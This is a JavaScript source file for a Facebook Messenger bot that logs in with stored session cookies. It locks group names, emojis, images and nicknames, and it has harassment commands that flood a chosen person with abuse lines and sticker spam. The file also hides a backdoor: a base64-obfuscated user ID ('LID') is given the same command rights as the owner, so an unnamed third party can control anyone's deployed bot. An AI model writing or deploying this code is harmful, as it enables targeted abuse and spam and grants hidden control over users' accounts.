const fs = require("fs");
const login = require("ws3-fca");
const axios = require("axios");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedEmojis = {};
const lockedDPs = {};
const lockedNicks = {};
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    setInterval(() => {
      for (const threadID in lockedEmojis) {
        api.getThreadInfo(threadID).then(info => {
          if (info.emoji !== lockedEmojis[threadID]) {
            api.changeThreadEmoji(lockedEmojis[threadID], threadID).then(() => {
              console.log(`😀 Emoji reverted in ${threadID}`);
            }).catch(e => console.error("Emoji revert error:", e.message));
          }
        }).catch(e => console.error("getThreadInfo error:", e.message));
      }
    }, 5000);

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData, type } = event;

        // Group name revert
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // DP revert in change_thread_image event
        if (type === "change_thread_image" && lockedDPs[threadID]) {
          const filePath = lockedDPs[threadID];
          if (fs.existsSync(filePath)) {
            try {
              await api.changeGroupImage(fs.createReadStream(filePath), threadID);
              console.log(`🖼 DP reverted in ${threadID}`);
            } catch (e) {
              console.error("DP revert failed:", e.message);
            }
          } else {
            console.warn("DP file not found for revert:", filePath);
          }
        }

        // Nickname revert
        if (logMessageType === "log:user-nickname" && lockedNicks[senderID]) {
          const lockedNick = lockedNicks[senderID];
          const currentNick = logMessageData?.nickname;
          if (currentNick !== lockedNick) {
            try {
              await api.changeNickname(lockedNick, threadID, senderID);
              console.log(`🔒 Nickname reverted for UID: ${senderID}`);
            } catch (e) {
              console.error("Nickname revert failed:", e.message);
            }
          }
        }

        // Target user reply with random np.txt line
        if (targetUID && senderID === targetUID && body) {
          if (fs.existsSync("np.txt")) {
            const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
            if (lines.length > 0) {
              const randomLine = lines[Math.floor(Math.random() * lines.length)];
              api.sendMessage(randomLine, threadID).catch(e => {
                console.error("Target reply failed:", e.message);
              });
            }
          }
        }

        if (!body) return;
        const prefix = ".";
        if (!body.startsWith(prefix)) return;

        const args = body.trim().substring(1).split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if (![ownerUID, LID].includes(senderID)) return;

        if (cmd === "help") {
          api.sendMessage(`
.help → मदद संदेश
.gclock [text] → ग्रुप नाम लॉक करें
.unlockgc → ग्रुप नाम अनलॉक करें
.lockemoji 😀 → इमोजी लॉक करें
.unlockemoji → इमोजी अनलॉक करें
.lockdp → DP लॉक करें
.unlockdp → DP अनलॉक करें
.locknick @mention + nickname → निकनेम लॉक करें
.unlocknick @mention → निकनेम अनलॉक करें
.allname [nick] → सभी का निकनेम बदलें
.uid → UID दिखाएं
.tid → ग्रुप ID दिखाएं
.exit → बोट को ग्रुप से निकालें
.rkb [name] → गालियाँ भेजें
.stop → स्पैम रोकें
.stickerX → स्टिकर स्पैम (X=सेकंड डिले)
.stopsticker → स्टिकर स्पैम बंद करें
.target [uid] → टारगेट UID सेट करें
.cleartarget → टारगेट क्लियर करें
          `, threadID);
        }
        else if (cmd === "gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }
        else if (cmd === "lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          lockedEmojis[threadID] = input;
          try {
            await api.changeThreadEmoji(input, threadID);
            api.sendMessage(`😀 Emoji locked → ${input}`, threadID);
          } catch {
            api.sendMessage("⚠️ Emoji lock fail!", threadID);
          }
        }
        else if (cmd === "unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("🔓 Emoji unlocked!", threadID);
        }
        else if (cmd === "lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const dpUrl = info.imageSrc;
            if (!dpUrl) return api.sendMessage("❌ Group DP nahi hai!", threadID);
            const response = await axios.get(dpUrl, { responseType: "arraybuffer" });
            const buffer = Buffer.from(response.data, "binary");
            const filePath = `locked_dp_${threadID}.jpg`;
            fs.writeFileSync(filePath, buffer);
            lockedDPs[threadID] = filePath;
            api.sendMessage("🖼 DP locked!", threadID);
          } catch {
            api.sendMessage("⚠️ DP lock error!", threadID);
          }
        }
        else if (cmd === "unlockdp") {
          delete lockedDPs[threadID];
          api.sendMessage("🔓 DP unlocked!", threadID);
        }
        else if (cmd === "locknick") {
          if (event.mentions && Object.keys(event.mentions).length > 0 && input) {
            const target = Object.keys(event.mentions)[0];
            const nickname = input.replace(Object.values(event.mentions)[0], "").trim();
            lockedNicks[target] = nickname;
            await api.changeNickname(nickname, threadID, target);
            api.sendMessage(`🔒 Nickname locked for ${target} → ${nickname}`, threadID);
          } else {
            api.sendMessage("❌ Usage: .locknick @mention + nickname", threadID);
          }
        }
        else if (cmd === "unlocknick") {
          if (event.mentions && Object.keys(event.mentions).length > 0) {
            const target = Object.keys(event.mentions)[0];
            delete lockedNicks[target];
            api.sendMessage(`🔓 Nickname unlocked for ${target}`, threadID);
          } else {
            api.sendMessage("❌ Mention kare kiska nick unlock karna hai!", threadID);
          }
        }
        else if (cmd === "allname") {
          if (!input) return api.sendMessage("❌ Nickname do!", threadID);
          const info = await api.getThreadInfo(threadID);
          for (const user of info.participantIDs) {
            try {
              await api.changeNickname(input, threadID, user);
            } catch {}
          }
          api.sendMessage(`👥 Sabka nickname change → ${input}`, threadID);
        }
        else if (cmd === "uid") {
          if (event.messageReply) {
            api.sendMessage(`🆔 Reply UID: ${event.messageReply.senderID}`, threadID);
          } else if (event.mentions && Object.keys(event.mentions).length > 0) {
            api.sendMessage(`🆔 Mention UID: ${Object.keys(event.mentions)[0]}`, threadID);
          } else {
            api.sendMessage(`🆔 Your UID: ${senderID}`, threadID);
          }
        }
        else if (cmd === "tid") {
          api.sendMessage(`🆔 Group Thread ID: ${threadID}`, threadID);
        }
        else if (cmd === "exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }
        else if (cmd === "rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }
        else if (cmd === "stop") {
          stopRequested = true;
          if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
        }
        else if (cmd.startsWith("sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive || i >= stickerIDs.length) {
              clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return;
            }
            api.sendMessage({ sticker: stickerIDs[i] }, threadID);
            i++;
          }, delay * 1000);
        }
        else if (cmd === "stopsticker") {
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
        }
        else if (cmd === "target") {
          targetUID = input.trim();
          api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
        }
        else if (cmd === "cleartarget") {
          targetUID = null;
          api.sendMessage("🎯 Target cleared!", threadID);
        }
      } catch (e) {
        console.error("⚠️ Error:", e.message);
      }
    });
  });
}

module.exports = { startBot };
